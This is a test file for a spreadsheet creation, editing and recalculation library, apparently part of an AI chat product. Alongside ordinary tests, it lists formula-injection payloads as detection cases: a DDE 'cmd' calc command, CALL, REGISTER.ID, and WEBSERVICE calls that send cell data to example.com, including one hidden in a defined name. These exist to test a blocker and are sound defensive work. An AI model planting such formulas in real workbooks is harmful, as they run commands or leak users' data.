import { afterAll, describe, expect, it } from 'vitest'
import { strFromU8, strToU8, unzipSync, zipSync } from 'fflate'
import { OfficeRenderer } from '../../office/src/engine.ts'
import { OfficePackage } from '../../office/src/package.ts'
import { buildTree, parseTree } from '../../office/src/tree.ts'
import { readRange } from '../../office/src/workbook.ts'
import { createWorkbook, editWorkbook, settleWorkbook } from '../../office/src/workbook-write.ts'
import { workbook } from './office-fixtures.ts'
import { PersonalChatError } from 'dsh-beluga'
import { reachesOutside, validateWorkbook } from '../src/host/workbooks.ts'

const signal = new AbortController().signal
const LIMIT = 16 * 1024 * 1024
const read = (bytes: Uint8Array, range?: string, sheet?: string) => readRange(OfficePackage.open(bytes, LIMIT, signal), { ...(range ? { range } : {}), ...(sheet ? { sheet } : {}) }, 24000)
const cell = (sheet: string, ref: string, value: unknown) => ({ sheet, cell: ref, value }) as never
const row = (number: number, ...cells: string[]) => `<row r="${number}">${cells.join('')}</row>`
const budget = row(1, '<c r="A1" s="3"><v>100</v></c>', '<c r="B1"><f>A1*2</f><v>200</v></c>') + row(2, '<c r="A2"><v>5</v></c>')

describe('XML tree', () => {
  it('writes back what it read', () => {
    const source = '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><a xmlns:x="u" b="1 &amp; 2"><x:c d="true"/><e xml:space="preserve">  t &lt; 5 &amp;  </e><!-- note --><f></f></a>'
    expect(strFromU8(buildTree(parseTree(source)))).toBe(source.replace('<f></f>', '<f/>'))
  })
})

describe('formulas that leave the workbook', () => {
  it('names the ones that fetch or run something, as files store them', () => {
    for (const formula of ['WEBSERVICE("https://example.com")', '_xlfn.WEBSERVICE(A1)', 'image("https://example.com/a.png")', '_xlfn.IMAGE(A1)', "cmd|'/c calc'!A1", 'CALL("x")', 'REGISTER.ID("x")', 'RTD("a",,"b")', '[1]Sheet1!A1', "'[2]Sheet 1'!A1", "'https://example.com/[a.xlsx]S'!A1"]) expect(reachesOutside(formula), formula).toBe(true)
  })
  it('leaves ordinary formulas and quoted text alone', () => {
    for (const formula of ['SUM(A1:A3)', 'IF(A1>0,"WEBSERVICE(","a|b")', "'a|b'!A1+1", 'TEXTJOIN("|",TRUE,A1:A3)', 'RTD_TOTAL+1', 'IMAGES!A1', 'SUM(销售[2024])', '"[1]"&A1']) expect(reachesOutside(formula), formula).toBe(false)
  })
  it('keeps the model from writing them', () => {
    expect(() => validateWorkbook({ title: 't', sheets: [{ name: 'A', rows: [[{ formula: '=WEBSERVICE("https://example.com/"&B1)' }]] }] })).toThrow('network')
  })
})

describe('creating a workbook', () => {
  const input = validateWorkbook({ title: '预算', sheets: [
    { name: '预算', header: true, filter: true, freeze: 'A2', formats: { B: '#,##0' }, rows: [['部门', '金额', '日期'], ['市场', 1200, { date: '2026-03-01' }], ['合计', { formula: '=SUM(B2:B2)' }, null], ['=1+1', true, null]] },
  ] })
  it('keeps types, formats and formulas', async () => {
    const bytes = await createWorkbook(input, signal)
    const range = read(bytes)
    expect(range.rows[1]).toEqual(['市场', 1200, '2026-03-01'])
    expect(range.formulas).toEqual({ B3: 'SUM(B2:B2)' })
    expect(range.rows[3]![0]).toBe('=1+1')
    const sheet = strFromU8(unzipSync(bytes)['xl/worksheets/sheet1.xml']!)
    expect(sheet).toContain('state="frozen"')
    expect(sheet).toContain('autoFilter')
  })
  it('rejects names Excel would reject, and duplicates', () => {
    expect(() => validateWorkbook({ title: 't', sheets: [{ name: 'a/b', rows: [['x']] }] })).toThrow()
    expect(() => validateWorkbook({ title: 't', sheets: [{ name: 'A', rows: [['x']] }, { name: 'a', rows: [['y']] }] })).toThrow('unique')
    expect(() => validateWorkbook({ title: 't', sheets: [{ name: 'A', rows: [[{ code: 'x' }]] }] })).toThrow()
  })
})

describe('editing a workbook', () => {
  const extra = { 'xl/styles.xml': '<?xml version="1.0" encoding="UTF-8" standalone="yes"?><styleSheet xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><cellXfs count="4"><xf numFmtId="0"/><xf numFmtId="0"/><xf numFmtId="0"/><xf numFmtId="3"/></cellXfs></styleSheet>', 'xl/media/logo.bin': 'not xml at all', 'xl/custom.xml': '<?xml version="1.0"?><keep   spaced="yes" />' }
  it('changes the cells asked for and no other part', () => {
    const source = workbook({ 数据: budget, 其他: row(1, '<c r="A1"><v>1</v></c>') }, extra)
    const edited = editWorkbook(source, [cell('数据', 'A1', 300)], LIMIT, signal)
    const before = unzipSync(source)
    const after = unzipSync(edited)
    const rewritten = new Set(['xl/worksheets/sheet1.xml', 'xl/workbook.xml'])
    for (const name of Object.keys(before)) if (!rewritten.has(name)) expect(Buffer.compare(after[name]!, before[name]!), name).toBe(0)
    expect(read(edited, 'A1:B1', '数据').rows[0]![0]).toBe(300)
  })
  it('keeps the cell style and places new rows and cells in order', () => {
    const edited = editWorkbook(workbook({ S: budget }, extra), [cell('S', 'A1', 7), cell('S', 'C1', '新'), cell('S', 'B5', true)], LIMIT, signal)
    const sheet = strFromU8(unzipSync(edited)['xl/worksheets/sheet1.xml']!)
    expect(sheet).toContain('<c r="A1" s="3"><v>7</v></c>')
    expect(sheet.indexOf('r="B1"')).toBeLessThan(sheet.indexOf('r="C1"'))
    expect(sheet.indexOf('<row r="2"')).toBeLessThan(sheet.indexOf('<row r="5"'))
    expect(read(edited, 'A5:B5').rows[0]).toEqual([null, true])
  })
  it('gives a date cell a date style', () => {
    const edited = editWorkbook(workbook({ S: budget }, extra), [cell('S', 'A2', { date: '2026-03-01' })], LIMIT, signal)
    expect(read(edited, 'A2:A2').rows[0]![0]).toBe('2026-03-01')
    expect(strFromU8(unzipSync(edited)['xl/styles.xml']!)).toContain('count="5"')
  })
  it('asks Excel to calculate on opening, and drops the stale calculation chain', () => {
    const source = unzipSync(workbook({ S: budget }))
    source['xl/calcChain.xml'] = strToU8('<?xml version="1.0"?><calcChain xmlns="http://schemas.openxmlformats.org/spreadsheetml/2006/main"><c r="B1" i="1"/></calcChain>')
    source['[Content_Types].xml'] = strToU8(strFromU8(source['[Content_Types].xml']!).replace('</Types>', '<Override PartName="/xl/calcChain.xml" ContentType="x"/></Types>'))
    source['xl/_rels/workbook.xml.rels'] = strToU8(strFromU8(source['xl/_rels/workbook.xml.rels']!).replace('</Relationships>', '<Relationship Id="rId9" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/calcChain" Target="calcChain.xml"/></Relationships>'))
    const after = unzipSync(editWorkbook(zipSync(source), [cell('S', 'A1', 1)], LIMIT, signal))
    expect(after['xl/calcChain.xml']).toBeUndefined()
    expect(strFromU8(after['[Content_Types].xml']!)).not.toContain('calcChain')
    expect(strFromU8(after['xl/_rels/workbook.xml.rels']!)).not.toContain('calcChain')
    expect(strFromU8(after['xl/workbook.xml']!)).toContain('fullCalcOnLoad="1"')
  })
  it('expands a shared formula before its anchor cell changes', () => {
    const sheet = row(1, '<c r="A1"><f t="shared" ref="A1:A3" si="0">B1*2</f><v>2</v></c>') + row(2, '<c r="A2"><f t="shared" si="0"/><v>4</v></c>') + row(3, '<c r="A3"><f t="shared" si="0"/><v>6</v></c>')
    const edited = editWorkbook(workbook({ S: sheet }), [cell('S', 'A1', 0)], LIMIT, signal)
    expect(read(edited).formulas).toEqual({ A2: 'B2*2', A3: 'B3*2' })
    expect(strFromU8(unzipSync(edited)['xl/worksheets/sheet1.xml']!)).not.toContain('shared')
  })
  it('refuses a merged cell, an array formula, a table header and an unknown sheet', () => {
    const merged = workbook({ S: row(1, '<c r="A1"><v>1</v></c>', '<c r="B1"/>') }, {})
    const files = unzipSync(merged)
    files['xl/worksheets/sheet1.xml'] = strToU8(strFromU8(files['xl/worksheets/sheet1.xml']!).replace('</sheetData>', '</sheetData><mergeCells count="1"><mergeCell ref="A1:B1"/></mergeCells>'))
    expect(() => editWorkbook(zipSync(files), [cell('S', 'B1', 1)], LIMIT, signal)).toThrow('merged')
    expect(editWorkbook(zipSync(files), [cell('S', 'A1', 2)], LIMIT, signal).length).toBeGreaterThan(0)
    const array = workbook({ S: row(1, '<c r="A1"><f t="array" ref="A1:A2">B1:B2*2</f><v>2</v></c>') + row(2, '<c r="A2"><v>4</v></c>') })
    expect(() => editWorkbook(array, [cell('S', 'A2', 1)], LIMIT, signal)).toThrow('array')
    expect(() => editWorkbook(workbook({ S: budget }), [cell('Nope', 'A1', 1)], LIMIT, signal)).toThrow('S')
    expect(() => editWorkbook(workbook({ S: budget }), [cell('S', 'A1', 1), cell('S', 'A1', 2)], LIMIT, signal)).toThrow('twice')
  })
})

describe('settling a workbook', () => {
  const renderer = new OfficeRenderer()
  afterAll(() => renderer.dispose())
  const settle = (bytes: Uint8Array, calculate = true) => settleWorkbook(bytes, LIMIT, calculate ? data => renderer.recalculate(data, signal) : undefined, signal)

  it('stores calculated values beside the formulas, of every type', async () => {
    const edited = editWorkbook(workbook({ S: budget, T: row(1, '<c r="A1"><f>S!A1&amp;"件"</f></c>', '<c r="B1"><f>S!A1&gt;1</f></c>') }), [cell('S', 'A1', 300)], LIMIT, signal)
    const { bytes, check } = await settle(edited)
    expect(check).toEqual({ recalculated: true, formulas: 3, errors: [], errorCount: 0, unverified: [] })
    expect(read(bytes, 'B1:B1', 'S').rows[0]![0]).toBe(600)
    expect(read(bytes, 'A1:B1', 'T').rows[0]).toEqual(['300件', true])
    expect(read(bytes, 'A1:B1', 'S').formulas).toEqual({ B1: 'A1*2' })
    expect(strFromU8(unzipSync(bytes)['xl/worksheets/sheet1.xml']!)).toContain('<f>A1*2</f>')
  })
  it('reports formula errors with their cells', async () => {
    const { check } = await settle(workbook({ S: row(1, '<c r="A1"><f>1/0</f></c>') }))
    expect(check.errors).toEqual([{ sheet: 'S', cell: 'A1', value: '#DIV/0!' }])
    expect(check.errorCount).toBe(1)
  })
  it('keeps the saved value of a function the engine lacks, and says so', async () => {
    const { bytes, check } = await settle(workbook({ S: row(1, '<c r="A1"><f>NOSUCHFUNCTION(1)</f><v>42</v></c>') }))
    expect(check.unverified).toEqual([{ sheet: 'S', cell: 'A1' }])
    expect(read(bytes).rows[0]![0]).toBe(42)
  })
  it('never hands a workbook that can reach a network to the engine', async () => {
    let called = false
    const reach = workbook({ S: row(1, '<c r="A1"><f>WEBSERVICE("https://example.com/"&amp;B1)</f></c>') })
    const { check } = await settleWorkbook(reach, LIMIT, async data => { called = true; return data }, signal)
    expect(called).toBe(false)
    expect(check.recalculated).toBe(false)
    expect(check.reason).toContain('network')
  })
  it('treats a defined name as part of the workbook', async () => {
    const reach = workbook({ S: row(1, '<c r="A1"><f>Leak</f></c>') }, {}, '<definedNames><definedName name="Leak">WEBSERVICE("https://example.com")</definedName></definedNames>')
    expect((await settleWorkbook(reach, LIMIT, async data => data, signal)).check.recalculated).toBe(false)
  })
  it('still delivers the file when the engine gives up on it', async () => {
    const { bytes, check } = await settleWorkbook(workbook({ S: budget }), LIMIT, async () => { throw new PersonalChatError('office-render', 'timeout') }, signal)
    expect(check.recalculated).toBe(false)
    expect(check.reason).toContain('could not calculate')
    expect(read(bytes).formulas).toEqual({ B1: 'A1*2' })
  })
  it('leaves Temporary Chat files in memory, with formulas for Excel to calculate', async () => {
    const { bytes, check } = await settle(workbook({ S: budget }), false)
    expect(check.recalculated).toBe(false)
    expect(check.reason).toContain('Temporary Chat')
    expect(strFromU8(unzipSync(bytes)['xl/workbook.xml']!)).toContain('fullCalcOnLoad="1"')
  })
  it('skips the engine when nothing needs calculating', async () => {
    let called = false
    const { check } = await settleWorkbook(workbook({ S: row(1, '<c r="A1"><v>1</v></c>') }), LIMIT, async data => { called = true; return data }, signal)
    expect(called).toBe(false)
    expect(check.recalculated).toBe(true)
  })
})
